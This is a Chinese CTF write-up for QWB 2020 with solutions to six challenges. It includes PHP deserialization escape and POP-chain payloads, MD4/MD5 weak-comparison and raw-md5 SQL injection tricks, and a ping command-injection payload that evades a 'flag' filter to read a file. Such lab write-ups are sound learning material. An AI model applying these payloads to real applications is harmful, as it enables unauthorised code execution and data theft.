# 强网杯2020部分WriteUp



<!--more-->

---

## MISC——签到

打开题目即可看到`flag`

![ ](/images/强网杯2020部分WriteUp/b93adbcf2d617bdeac5b82b4ec9a9d928d79e6c257a294d27ea056d55abd022e.png " ")


---


## 强网先锋——web辅助

打开题目，下载附件源码，共有 4 个文件，其中 `index.php` 与 `play.php`，是序列化与反序列化的执行文件，`class.php` 是类文件，`common.php` 是工具文件。

在`index.php`中，接收两个参数并生成对象，最后将对象信息经过处理后存进文件中：

![ ](/images/强网杯2020部分WriteUp/479e6ae76e0f49e90b8babc4aafd201dbd8d7257e1ba878d31e54fbdd619ad35.png " ")



在`play.php`中，读取文件内容，并经过检查和处理后，反序列化成对象：

![ ](/images/强网杯2020部分WriteUp/b223bfe59729acef101b5a13241825a11916c999b1142b7421293e2cd4067dfc.png " ")



在`class.php`中，存在几个类的定义，具体分析如下：

* **jungle**类：读取`flag`的类
   * **KS()**：执行系统命令读取了`flag`
   * **__toString()**：调用了 KS()。因为 \_\_toString() 的特性，当该类的对象被当字符串进行处理时，都会调用 \_\_toString() ，例如`echo new jungle()`，当然除了`echo`，还有其他方法也能触发调用 \_\_toString()，如`strlen()`、`strstr()`等等
   
   **jungle** 类是一个关键类，关乎到是否能读取`flag`，在这个类中，想要调用 **KS()** 读取`flag`，就得利用 **__toString()** 的特性，让 **jungle类对象** 被当作字符串处理，即可读取`flag`

<br />

* **midsolo**类：触发 **jungle类__toString()** 的类
   * **Gank()**：将 $this->name 进行了 stristr() 判断
   * **__invoke()**：调用了 Gank()
   * **__wakeup()**：给 $this->name 赋值为字符串

   在 **midsolo** 类中，关键的地方在于 **Gank()** 方法中的 **stristr()** 判断。根据上面 jungle 类的分析，如果这里 **$this->name** 为 **jungle类对象** 时，那么就会 **调用jungle类的__toString()**，从而调用 **KS()** 读取到`flag`
   
   而在 **__invoke()** 方法，调用了 **Gank()**，也就是说，当 **midsolo的类对象被当成方法调用** 时，即可调用 **Gank()**，如下：
   ```php
   <?php
      $obj = new midsolo();
      $obj();
   ?>
   ```
   
   最后 **__wakeup()** 中，给 **$this->name** 赋了值，如果 **想让$this->name为jungle类对象的话，就得绕过__wakeup()**

<br />

* **topsolo**类：**调用midsolo类对象** 的类
   * **TP()**：判断 $this->name 是否为 function 或 object ，并且去执行它
   * **__destruct()**：析构方法，会调用 TP() 

   在 **topsolo** 类中，关键点就在于 **TP()**，会去执行 **$this->name()**，根据上面 midsolo 类的分析，如果 **$this->name赋值为 midsolo 类对象，那么就可调用 midsolo 类的 __invoke() 与 Gank()**

<br />

* **player**类：可以实际控制的类
   **player** 为入口类，两个成员变量可控制，可以**将成员变量赋值为 topsolo 类对象**，这样就能依次调用上面的类方法了

<br />

根据上面的分析，其实已经可以看出点端倪了，可以根据上面的类来构造一个`POP链`，获取`flag`，如下：
```php
<?php
@error_reporting(0);
require_once "common.php";
require_once "class.php";


$jungle = new jungle();
$midsolo = new midsolo($jungle);
$topsolo = new topsolo($midsolo);
$player = new player('aaa', $topsolo);
?>
```

<br />

最后的`common.php`，存在三个方法：**read()**、**write()**、**check()**

![ ](/images/强网杯2020部分WriteUp/dd2dde06b017f8be3d8b92b876d2664df022dd84c1a2fd6b12e78c2bfe0482e6.png " ")

其中 **write()** 在序列化的时候调用，将`0x00*0x00`替换成`\0*\0`，而 **read()** 则相反，在反序列化的时候调用，将`\0*\0`替换成`0x00*0x00`，而 **check()** 也是在反序列化的时候调用，检查反序列化的数据是否存在`name`字段。其实看到这里，已经可以发现 **write()** 与 **read()** 存在 **反序列化逃逸** 的漏洞，这里我们先简单学习下 **反序列化逃逸** 的知识点。

首先，PHP 在反序列化时，会根据变量的类型来生成变量，如果是字符串类型，还会根据长度来生成字符串。而如果长度值超出了后面的定义的字符串的话，PHP 会继续向后取内容，直到取满相同长度的字符。这样说的可能有点抽象，举个例子演示一下：

```php
<?php
    class A{
        public $name;
        public $age;

        public function __construct($name, $age){
            $this->name = $name;
            $this->age = $age;
        }
    }


    $A = new A('xiaoming', 18);
	var_dump($A);
	echo '<hr>';

    $str = serialize($A);
    echo $str;
    echo '<hr>';

    $str = substr_replace($str,'26',24,1);
    $str .= '";s:3:"age";s:8:"xiaoming";}';
    echo $str;
    echo '<hr>';

    var_dump( unserialize($str));
?>
```

执行结果如下：

![ ](/images/强网杯2020部分WriteUp/28042f1b3155fa5200cf95626e7e7ead253a2987409ec04b98cb10ced2a78b8b.png " ")

我们最初定义`name = 'xiaoming'`，`age = 18`，在经过序列化并对序列化数据进行了改变，再次反序列化回来的时候值都被改变了，特别是`age`，连类型都改变了，这是为什么呢？

在输出的第三行中，可以看到`s:8`被改成了`s:26`。这是什么意思呢？这代表`name`成员是一个字符串类型，并且字符串的长度是 26。

当 PHP 收到修改后的数据后，读取到 26 时，就真的会以 26 的长度去读取内容赋值给 `name`成员，所以说最后`name`变成了`xiaoming";s:3:"age";i:18;}`，将之前的`age`的定义当成了`name`的值。而读取了`name`的内容之后，PHP 会继续反序列化，读取到我们自己构造的数据，于是将`age`赋值成了`xiaoming`。

<br />

再次回过头来看 **write()** 与 **read()**，它们的内容中都有`\0*\0`与`0x00*0x00`，这两段字符串的区别是长度不同，`\0*\0`长度为 5，而`0x00*0x00`长度为 3，可用如下代码做个实验：

```php
<?php
    echo strlen($_GET['a']);
    echo '<br />';
    echo strlen($_GET['b']);
?>
```

访问`?a=\0*\0&b=%00*%00`得到结果如下：

![ ](/images/强网杯2020部分WriteUp/b93cc6aec566d1e1a28213f7f69dc1b09d504f91fdf844ae6c2d84560740ed4a.png " ")

而`read()`将`\0*\0`替换成`0x00*0x00`，那么替换后的字符串会比原字符串少2个字符，于是产生了漏洞。这里为了说得清楚一些，用`player`来做个实验：

```php
<?php
    @error_reporting(0);
    require_once "common.php";
    require_once "class.php";

    $player = new player($_GET['a'], $_GET['b']);
    $ser = serialize($player);
    echo $ser;                  // 序列化时

    echo '<br /><hr>';

    $ser = write($ser);
    echo $ser;                  // write时

    echo '<br /><hr>';

    $ser = read($ser);
    echo $ser;                  // read时

    echo '<br /><hr>';

    var_dump( unserialize($ser));       // 反序列化时
    echo '<br /><hr>';
?>
```

访问`?a=\0*\0&b=123`，如下：

![ ](/images/强网杯2020部分WriteUp/01b32705052e3bfa7ef367992de20e466f38232d029d9176273fe8331001da59.png " ")

在序列化时，`user`参数的值为`\0*\0`，长度为5，而经过`write()`方法后，`user`参数的值和长度未发生任何变化，因为值中不包含`0x00*0x00`，所以不会进行替换。

而在经过`read()`后，因为`user`参数的值中包含`\0*\0`，于是值被替换成了`0x00*0x00`，但长度并没有改变，依然还是5，PHP 会以 5 的长度来读取字符串，但实际上`0x00*0x00`的长度只有 3，于是 PHP 继续向后读取，把`";`也当成了字符串的一部分，然后继续反序列化，因为`"`被当成了字符串，后面没有`"`了，导致闭合失败，最终反序列化失败。

通过这种方式，就可以像之前的例子一样，靠长度不一致的问题，把反序列化中原本的对象信息给当成字符串，而自己再构造相应的数据，来达到修改对象中其他成员变量的值。

<br />

最后总结下上面的分析：

* 获取`flag`，需要通过`POP链`
* 在`play.php`文件中，反序列化`player`类对象时存在反序列化逃逸，利用这点可以构造`POP链`的类信息
* 受控制的参数为`player`类对象的`user`和`pass`，利用`username`参数把`user`成员填充为`\0*\0`的形式，用来反序列化逃逸，利用`password`的参数把`pass`成员构造成`POP链`类对象，用来获取`flag`

<br />

一步一步来，先把上面的`POP链`的反序列化信息生成出来，如下：
```shell
O:6:"player":3:{s:7:"0x00*0x00user";s:3:"aaa";s:7:"0x00*0x00pass";O:7:"topsolo":1:{s:7:"0x00*0x00name";O:7:"midsolo":1:{s:7:"0x00*0x00name";O:6:"jungle":1:{s:7:"0x00*0x00name";s:7:"Lee Sin";}}}s:8:"0x00*0x00admin";i:0;}
```

由于只需要给`pass`变量赋值，所以需要截取一段：

![image-20200824012335908](/images/强网杯2020部分WriteUp/1fa06aca2b736825ce05c39a29daf02caa7c92efdaa9481d74a4cf14b3b61c51.png " ")

```shell
";s:7:"0x00*0x00pass";O:7:"topsolo":1:{s:7:"0x00*0x00name";O:7:"midsolo":1:{s:7:"0x00*0x00name";O:6:"jungle":1:{s:7:"0x00*0x00name";s:7:"Lee Sin";}}}s:8:"0x00*0x00admin";i:0;}
```

然后计算需要逃逸的字符长度，这里拿上面的图举例：

![image-20200824013220924](/images/强网杯2020部分WriteUp/5b0e807e68ff84ee00191e79d9e463df37252653301e8ae58072ad1b19021a62.png " ")

在这副图中，我们能控制的是这两个框中的内容，而我们的目标是控制`pass`成员变成`POP链`，如何控制呢？就需要进行逃逸，让`user`把后面原本的`pass`信息给**吃掉**，也就是将其作为`user`的变量，这样我们构造的`pass`信息就可以进行闭合，从而就能完全控制`pass`的值了。所以这两个框之间的内容`";s:7:"0x00*0x00pass";s:3:"`，就是需要逃逸的内容。

`";s:7:"0x00*0x00pass";s:3:"`，一共占用 21 个字符长度（`0x00`占一个字符长度），需要注意的是，这段字符串最后的`s:3`，指的是传递给`pass`的长度，也就是上面的`POP链的长度` 145，所以需要逃逸的字符串实际为`";s:7:"0x00*0x00pass";s:145:"`，占用23个字符长度。

根据上面的结论，`read()`转换一个`\0*\0`，就会多出两个字符的长度，23个字符就需要 12对`\0*\0`，12对`\0*\0`会多出 24个字符的长度，所以`POP链`得多加一个字符：

```shell
A";s:7:"0x00*0x00pass";O:7:"topsolo":1:{s:7:"0x00*0x00name";O:7:"midsolo":1:{s:7:"0x00*0x00name";O:6:"jungle":1:{s:7:"0x00*0x00name";s:7:"Lee Sin";}}}s:8:"0x00*0x00admin";i:0;}
```



所以`Payload`就变成了：

```shel
?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=A";s:7:"%00*%00pass";O:7:"topsolo":1:{s:7:"%00*%00name";O:7:"midsolo":1:{s:7:"%00*%00name";O:6:"jungle":1:{s:7:"%00*%00name";s:7:"Lee Sin";}}}s:8:"%00*%00admin";i:0;}
```

先在本机测试一下：

![image-20200824014746455](/images/强网杯2020部分WriteUp/96324ad9b0245e408002f4c67f6c6ba2af2fc9ee62f238276bd3e2af840152a0.png " ")

可以看到已经反序列化成功了，但是并没有执行成功，因为`midsolo`类中有个`__wakeup()`，将`name`变成了字符串了，而不是 **jungle类对象** 了，需要绕过`__wakeup()`，将`midsolo`成员属性的个数改成2即可绕过，于是`Payload`就变成了：

```shell
?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=A";s:7:"%00*%00pass";O:7:"topsolo":1:{s:7:"%00*%00name";O:7:"midsolo":2:{s:7:"%00*%00name";O:6:"jungle":1:{s:7:"%00*%00name";s:7:"Lee Sin";}}}s:8:"%00*%00admin";i:0;}
```



再次验证：

![image-20200824015133586](/images/强网杯2020部分WriteUp/2ba9f9a09960bbb04f8e3aded8f94ebf581bb01fbe0339d818d224fa127b43af.png " ")

注意我在本地把执行的命令改成了`ping`



执行成功之后尝试去`get flag`，先访问`Payload`，然后访问`play.php`，提示失败：

![image-20200824015317503](/images/强网杯2020部分WriteUp/5ed9ad5713c90f0f38d7436787b168098c7156f7465da380020d4056453be62b.png " ")

可以看到这里是在`check()`被拦了



再回头看`check()`，很简单的一个方法，就是判断反序列化数据中是否包含`name`，包含就退出。而在`Payload`中，的确是包含`name`的，因为`name`是其他类的成员属性，无法避免，所以在这里卡了很久，不知道咋绕过，最后问了下大佬，大佬说用 16进制代替字符串，也就是将`name`变成 16进制的格式`\6e\61\6d\65`，并且它的类型不能是小写的`s`，需改成大写的`S`，最后`Payload`就变成了：

```shell
?username=\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0&password=A";s:7:"%00*%00pass";O:7:"topsolo":1:{S:7:"%00*%00\6e\61\6d\65";O:7:"midsolo":2:{S:7:"%00*%00\6e\61\6d\65";O:6:"jungle":1:{S:7:"%00*%00\6e\61\6d\65";s:7:"Lee Sin";}}}s:8:"%00*%00admin";i:0;}
```



最后访问之后得到`flag`：

![image-20200824020408604](/images/强网杯2020部分WriteUp/c4edf5d931901c9d6b8e9819bf01b09a8dd7a4f4ba6d01913da79d84501e2087.png " ")


---


## 强网先锋——Funhash

这道题主要考的是 PHP 中，关于弱类型比较与 md5() 相关的漏洞，如果接触得比较多的话，一下就应该做出来了，下面有两个参考链接，光看这两个链接都能把题做出来。我这里由于是第一次碰到这个题，所以还是记录下过程。

源码如下：

```php
<?php
include 'conn.php';
highlight_file("index.php");
//level 1
if ($_GET["hash1"] != hash("md4", $_GET["hash1"]))
{
    die('level 1 failed');
}

//level 2
if($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3']))
{
    die('level 2 failed');
}

//level 3
$query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'";
$result = $mysqli->query($query);
$row = $result->fetch_assoc(); 
var_dump($row);
$result->free();
$mysqli->close();
?>
```



首先来看`level 1`，需要`hash1` 与 `md4(hash1)` 相等，看到这里我第一想法是不可能，这机率太小了，然后还是写了个脚本爆破了一晚上，不出意外没有结果。第二天，网上搜资料的时候，才发现这里用的判断是`!=`，结合 PHP 的弱类型比较一搜，果然这里有猫腻，经过测试发现，只要满足`0e+数字`，后面的数字无论怎么变都是相等的，所以只需要构造`hash1`是`0e+数字`的格式，并且`md4(hash1)`的结果也是`0e+数字`的格式即可。于是再次构造脚本爆破，这里思路正确了，但是脚本构造的有问题，如下：

```python
import hashlib
import string
import itertools
from Crypto.Hash import MD4

data = string.digits
string.ascii_letters

for i in range(1,33):
    for i in itertools.product(data,repeat=i):
        str = bytes("".join(('0e',)+i),'utf8')
        h = MD4.new()
        h.update(str)
        md4str = h.hexdigest()
        if md4str.startswith('0e') and md4str.isnumeric():
            print('it\'s find!')
            print('str:%s, md5str:%s'%(str, md4str))
            exit()
```



我这里想的是构造` 1 ~ 32` 位的字符，依次慢慢增加位数爆破，类似于笛卡尔积的模式，其实这样思路没有问题，最后肯定是能爆破出来的，只是时间有点长，在这里等了几个小时，发现没有结果，以为自己的思路有问题，于是咨询了下大佬，大佬丢了个脚本过来，如下：

```python
import hashlib
import re
prefix = '0e'
def breakit():
    iters = 0
    while 1:
        s  = (prefix + str(iters)).encode('utf-8')
        hashed_s = hashlib.new('md4', s).hexdigest()
        iters = iters + 1
        r = re.match('^0e[0-9]{30}', hashed_s)
        if r:
            print ("[+] found! md4( {} ) ---> {}".format(s, hashed_s))
            print ("[+] in {} iterations".format(iters))
            exit(0)

breakit()
```



大佬的脚本就是从 1 开始，依次 +1，然后加上前缀 `0e` 进行爆破。这样的方式其实并不算完美，会漏掉一些字符串，例如`01`。不过这道题的确是得这样做，在跑了 10 多分钟之后，就找到结果了：

![image-20200823201411637](/images/强网杯2020部分WriteUp/d41cc5121bdf03e3873442896dd98d2ab8b081334e5e6702da5ebf055454dee8.png " ")



接着再来看`level 2`，在`level 2`，没有使用到`==`与`!=`，所以无法利用上面的方式进行绕过，在这里网上搜索了资料，得知 PHP 的`md5()`无法处理数组，当构造`hash2[]=1&hash3[]=2`，即可绕过这里的判断。

最后来看`level 3`，这里是我第一眼看到题目时觉得最难的地方，前面两个都是进行有目的的哈希碰撞，这里完全没有目标，所以这里我没有做出来，最后问了大佬，大佬提醒我说 PHP 的 `md5()`函数第二个参数为`true`时，会产生漏洞。我拿着这信息去搜索了下，找到了相关的信息，大概就是当 `md5()`函数第二个参数为`true`时，该函数返回的是哈希值的`16字符的二进制格式`，如下：

![image-20200823192324995](/images/强网杯2020部分WriteUp/b7798c1f887aa0833cb31a825f96f66df61cb473898442452c83b71a43d8c931.png " ")

第一处，是`md5('b',false)`的结果，这里返回的就是 32 字节的`ascii`形式的哈希值，而第二处，是`md5('b',true)`的结果，可以看到前面几个字节与第一处是一样的，相当于是第一处的二进制格式。在第二处的右边可以看到，这几个二进制数据，转化为`ascii`码之后，变成了`'or'xxx`，如果将这几个字符与页面上的`SQL语句`拼接的话，就形成了下面的语句：

```php
$query = "SELECT * FROM flag WHERE password = '" . "'or'xxx" . "'";
```

而在`MySQL`中，`or`后面只要不为0，即为真，所以这里相当于造成了`SQL注入`，于是就满足了查询条件，得到了`flag`，如下：

![image-20200823185538378](/images/强网杯2020部分WriteUp/5478ff47c5c241e9a8416c8522251354ecf46d628110643c04ed61f2d5328278.png " ")



Payload：`?hash1=0e251288019&hash2[]=1&hash3[]=2&hash4=ffifdyop`



参考链接：

https://blog.csdn.net/zz_Caleb/article/details/84947371

https://www.cnblogs.com/piaomiaohongchen/p/10659359.html


---


## 强网先锋——upload

下载题目附件，可看到是一个数据包`data.pcapng`，用`Wireshark`打开，可看到都是`HTTP`的数据：

![image-20200823171355987](/images/强网杯2020部分WriteUp/3da4763c57d05b6eb4a05ac5b51d79dee43e69e359f438f697b04507874c44b1.png " ")



右键`追踪流 ==> TCP流`，在第 2 个流中，可看到上传了一张名为`steghide.jpg`的图片，如下：

![image-20200823171328459](/images/强网杯2020部分WriteUp/bcbb9ef15999b92a75016221e83648605e70909dcb6a2912ec8164748bd84d86.png " ")



将图片数据提取出来，保存成图片文件，如下：

![image-20200823172650758](/images/强网杯2020部分WriteUp/08d5fb77fcf2cd79a4adb42a4a34dee543e8e595e65df35663c3d831dfc85796.png " ")



从上传的数据包里可看见，上传的文件名为`steghide.jpg`，猜测与隐写工具`steghide`有关，于是用`steghide`查看一下文件信息：

![image-20200823173123927](/images/强网杯2020部分WriteUp/d3fcb66265bf386e76f1212c322b8c627f41aabcea5b92e67e621bf7713c1822.png " ")



发现有密码，随手一测`123456`，发现密码正确：

![image-20200823173238110](/images/强网杯2020部分WriteUp/5742d4779c34fb117900b8f962d3719835eee8d62ee064062003c35693a4f14e.png " ")



于是提取`flag.txt`，得到`flag`：

![image-20200823173322237](/images/强网杯2020部分WriteUp/4659f12b00e40c1d884229f31c2e65275782d0486aaaa70a3fe644bcbb587749.png " ")



参考链接：http://www.safe6.cn/article/102


---


## 强网先锋——红方辅助

下载附件，得到两个文件`client.py`、`enc.pcapng`

先来看`client.py`，该脚本就是读取文件并且加密后发送给服务器，主要逻辑如下：

![image-20200824022220030](/images/强网杯2020部分WriteUp/c4e499de2d6a68834c0775916c3bc86fc2a0ad4bf67730cb0375375ed3b4c2d0.png " ")



* 打开文件并读取每一行数据
* 发送`G`到服务端
* 接收 4 字节服务端发来的数据
* 将每一行数据、接收到的 4 字节数据、计数变量一起传递给加密函数，得到两个值，`data`为加密后的数据
* 将刚才得到的数据发送给服务端
* 获取 4 字节服务端发来的数据，并与计数变量进行比较



从上面的流程可以看到，与服务端交互的过程是`发送 ==> 接收 ==> 发送 ==> 发送 ==> 接收`



现在再来看`enc.pcapng`，打开之后右键选择`追踪流 ==> TCP流`，在第 2 个流中可看到大量加密后的数据，如下：

![image-20200824022849106](/images/强网杯2020部分WriteUp/ede59afb8b018185256b4073497adee1f572144ed6de4bd6c2ee6e24f5565c19.png " ")



可以看到其中有很多`G`，可以判断这就是发送的数据包，在这里我们将流显示为`原始数据`，看得更清晰：

![image-20200824023035570](/images/强网杯2020部分WriteUp/930ef3346ab7d97bed618ef75d43a8687b1dc3da5bbffd4bd4b7de1ca1fd625c.png " ")



可以很清晰地看出，这就是每一次发送接收的数据流，与之前分析的过程一模一样，都是`发送 ==> 接收 ==> 发送 ==> 发送 ==> 接收`：

![image-20200824023322550](/images/强网杯2020部分WriteUp/ff497804c66a6c62f6ba6dfbff3e60edf595b6c94bd10f7d50af40a847888908.png " ")

经过分析，服务端发送来的数据`btime`为时间戳，而`pcount`则是和计数变量一致的内容



接下来再来分析加密函数，如下：

![image-20200824023602505](/images/强网杯2020部分WriteUp/82906db1875a01a8cb9f08ba06c0312645307e910609878358ae98996e31b937.png " ")

其中返回的`boffset`是`offset`变量中的其中一个，这个通过观察流量包也能看出来，永远都是三个之中的一个。

`enc`则是将一堆算出来的值，合在一起的东西。



在这个题中，我们主要是要知道它传输的内容到底是什么，也就是加密函数的形参`data`，而在加密函数的 37 行这里，将`data`一个一个取出来，进行一顿异或和模之后，得到的结果给`enc`并传送给服务端。也就是说现在我们手上有加密的数据，加密的算法，现在需要写出解密算法，来将加密数据给解密出来。



首先来看加密函数的 35 行，这里是`enc`首次被打包赋值，这几个值是解密的关键，而且这几个值没有被加密，可以从数据中得到。先来看看这个打包的格式`<IIcB`，`<`代表用小端存储，`I`代表`int`型，占 4 字节，`c`代表`char`型，占 1 字节，`B`代表`unsigned char`，占 1 字节。而在第一次的数据包中就对应如下这几个字节：

![image-20200824024653953](/images/强网杯2020部分WriteUp/c6b050a08c9fc79024f251be436ea08aea238252cbcb0413cd1197db43eed3f2.png " ")

转换回来的话就是：

```python
enc = struct.pack("<IIcB", 0, 132, '0', 14)
```

而下面的加密循环就变成了这样：

```pyth
i = 0 
for c in data:
    enc += chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256))
    i = (i + 1) % 4
```

其中的`t`也是能从数据包中找到的，所以最后就只剩`c`不知道，也就是`data`的每一个字符不知道是啥。



求`c`怎么求呢，因为加密数据包已经知道了，所以它每次加密后的结果是知道的，例如第一个是`a4`，那么`chr((funcs['0'.decode()](ord(c) ^ ord(t[i]), 14) % 256)) = 0xa4`，在这种表达式下，`c`的值肯定是`0 ~ 255`之间的一个值，为什么呢，因为它是`data`中的字符啊，而`data`是可以显示的字符串，所以它的每一个字符都是可显示的，那么就肯定是`0 ~ 255`的值，这时就可以进行枚举`c`，从`0 ~255`中枚举，哪一个满足这个表达式那么`c`就为那个。



有了上面的思路，就可以写脚本了，先将数据包里的原始数据保存成`data.txt`，然后运行脚本：

```python
import struct

def decrypt(data, btime, fn, salt):
    funcs = {
        "0": lambda x, y: x - y,
        "1": lambda x, y: x + y,
        "2": lambda x, y: x ^ y
    }

    offset = {
        "0": 0xefffff,
        "1": 0xefffff,
        "2": 0xffffff,
    }

    t = struct.unpack("<i", btime)[0]
    boffset = offset[fn.decode()]
    t -= boffset
    t = struct.pack("<i", t)

    i = 0
    for c in data:
        for ss in range(0, 256):
            if (funcs[fn.decode()](ss ^ t[i], salt) % 256) == c:
                print(chr(ss), end='')
                break
        i = (i + 1) % 4

f = open("data.txt", "r")
readlines = f.readlines()
f.close()

for i in range(0,len(readlines),5):
    data = readlines[i+3]
    btime = bytes.fromhex(readlines[i+1][:-1])
    fn = bytes.fromhex(data[16:18])
    salt = ord(bytes.fromhex(data[18:20]))
    data = bytes.fromhex(data[20:-1])

    decrypt(data, btime, fn, salt)
```



最后运行的结果如下， 把每一个字符提出来加上QWB{}就得到`flag`：

![image-20200824030245817](/images/强网杯2020部分WriteUp/1b402a35c7594da7b2456ff54641a2db632676c2a1ca652e4ee36075430c58ed.png " ")


---


## 强网先锋——主动

打开链接得到源码：

```php
<?php
highlight_file("index.php");

if(preg_match("/flag/i", $_GET["ip"]))
{
    die("no flag");
}

system("ping -c 3 $_GET[ip]");

?> 
```



很基础的命令执行，先查看当前目录下的文件：

![image-20200823173950037](/images/强网杯2020部分WriteUp/380cda933f118e1dd80a444394e0cf88a57649039da7a1ea02dac4ded854de20.png " ")



可看到`flag.php`在当前目录下，但是因为上面的正则表达式无法直接读取文件，这里利用 Linux 的变量机制来绕过正则：

![image-20200823175004665](/images/强网杯2020部分WriteUp/31f01dcd8d0385902f362f288e72de2c5f9f4a6b9acee453e3e6c72291f73686.png " ")



Payload：`?ip=8.8.8.8;a="fla";b="g.php";cat%20"./"$a$b`

---

{{< admonition abstract "链接" >}}
相关题目：[强网杯2020WriteUp相关题目.zip](/others/强网杯2020部分WriteUp/强网杯2020WriteUp相关题目.zip)
{{< /admonition >}}







